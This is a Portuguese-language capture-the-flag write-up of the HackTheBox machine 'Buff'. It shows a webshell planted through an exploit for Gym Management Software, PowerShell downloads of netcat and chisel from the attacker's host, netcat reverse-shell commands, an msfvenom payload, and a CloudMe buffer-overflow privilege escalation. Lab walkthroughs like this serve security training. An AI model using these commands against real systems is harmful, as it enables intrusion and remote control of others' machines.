
<html>
 <body>
  <script src="https://www.hackthebox.eu/badge/148108"></script>
 </body>
 </html>
Back to all write-ups: [here](https://repo4chu.github.io/hackthebox/)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Buff - HackTheBox - WriteUp
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![Image](https://i.imgur.com/R54hsZz.png)

**Tools** utilizadas
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Nmap
Python
Powershell
Netcat
msfvenom
chisel
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vamos iniciar fazendo um scan com o Nmap procurando portas e serviços ativos:

Ao acessar o serviço Web, podemos encontrar a versão do CMS utilizado no site:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
http://10.10.10.198:8080/contact.php
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
![Image](https://i.imgur.com/DiDlRxp.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Gym Management Software 1.0
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Após encontrarmos a versão do CMS, podemos buscar por falhas já conhecidas sobre ele.

No site [Exploit-DB](https://www.exploit-db.com/) encontramos alguns exploits e um deles nos parece muito interessante;
![Image](https://i.imgur.com/lsXr8UN.png)

O [exploit](https://www.exploit-db.com/exploits/48506), consegue executar comandos de forma remota e sem autenticação!

Bom, vamos testa-lo!

![Image](https://i.imgur.com/APlOWvl.png)

Podemos ver que o exploit funcionou e realizou o upload de uma webshell. XD

Nossa webshell foi inserida no caminho:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
http://10.10.10.198:8080/upload/kamehameha.php
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Se quisermos utilizar o navegador para realizar comandos utilizamos o parametro 'telepathy' para passar nossos comandos:
Ex:

![Image](https://i.imgur.com/sfh8O6T.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
http://10.10.10.198:8080/upload/kamehameha.php?telepathy=whoami
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vamos usar a shell em nosso terminal. Após conseguirmos executar comandos, vamos tentar realizar a conexão reversa.
Subiremos um servidor com python em nossa máquina para enviarmos o netcat para nosso alvo:

![Image](https://i.imgur.com/A76DKtv.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python -m SimpleHTTPServer 80
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vamos tentar jogar o netcat dentro da máquina alvo, através de nossa shell inicial.

Vamos usar o PowerShell para isso
![Image](https://i.imgur.com/o8Mxo8K.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
powershell Invoke-WebRequest -Uri 'http://10.10.14.146/nc.exe'-OutFile 'C:\xampp\htdocs\gym\upload\nc.exe'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Após realizarmos o upload, vamos fazer a conexão com nossa máquina através do netcat.
![Image](https://i.imgur.com/eAPcQcR.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.\nc.exe 10.10.14.146 433 -e powershell.exe
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Em nossa máquina, abrimos a porta 443 para o netcat se conectar:

![Image](https://i.imgur.com/21enBIH.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nc -vnlp 443
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Ao ganhar o acesso inicial e realizarmos a enumeração do que está rodando na máquina, podemos encontrar um software chamado CloudMe 1.11.2

![Image](https://i.imgur.com/AJwypaK.png)

Vamos fazer como fizemos no outro software, vamos buscar por falhas conhecidas:
![Image](https://i.imgur.com/c3I6v0R.png)


Ao pesquisar mais a fundo sobre esse software, é possível encontrar um [exploit](https://www.exploit-db.com/exploits/48389) que utiliza Buffer Overflow na versão 1.11.2 para escalção de privilégios.

Ao analisar o CloudMe, podemos ver que ele está rodando somente local...
Nosso alvo não possuí python para conseguirmos executar o exploit...
Vamos tentar um portforward para executar o exploit.
Na primeira vez que fiz essa box, usei o plink.exe, porém, quando fui refazer para tirar as prints, tentei durante horas e não funcionou...

Para isso vamos tentar utilizar o chisel.exe para isso:

Vamos envia-lo para a máquina:
![Image](https://i.imgur.com/LTIYDYM.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
powershell Invoke-WebRequest -Uri 'http://10.10.14.145/windao.exe'-OutFile 'C:\xampp\htdocs\gym\upload\windao.exe'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

_Salvei com esse nome pra evitar outras pessoas usando o mesmo arquivo(RIP vip)_
![Image](https://i.imgur.com/LoeaAmJ.png)


Vamos editar o payload do exploit para conectar-se a nossa máquina:
Usando o msfvenom criamos um payload:

![Image](https://i.imgur.com/fabuhuw.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
msfvenom -p windows/exec CMD='c:\xampp\htdocs\gym\upload\nc.exe 10.10.14.145 4444 -e cmd.exe' -b '\x00\x0A\x0D' -f python -v payload
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Após isso inserimos ele dentro de nosso exploit(48389.py).

![Image](https://i.imgur.com/mRyjpnO.png)

Ativando o Chisel como server:

![Image](https://i.imgur.com/a37b5Y2.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
./chisel server --reverse --port 10001
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Usando o Chisel como client:

![Image](https://i.imgur.com/LuzPSpK.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.\chisel.exe client 10.10.14.145:10001 R:3306:localhost:3306 R:8888:localhost:8888
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Após a conexão ser concluida no Chisel, podemos executar o exploit já editado com o nosso payload, que realiza uma conexão na porta 4444, portanto, abrimos a porta com o netcat e aguardamos a conexão. Obs: tive que executar o exploit mais de uma vez para receber a conexão.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nc -vvnlp 4444
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
agora somos admin/root XD

![Image](https://i.imgur.com/ynbFR0B.png)


if i helped you, add + respect at my profile :D
<html>
 <body>
  <script src="https://www.hackthebox.eu/badge/148108"></script>
 </body>
 </html>


My references:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
https://github.com/jpillora/chisel
https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
https://ippsec.rocks/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
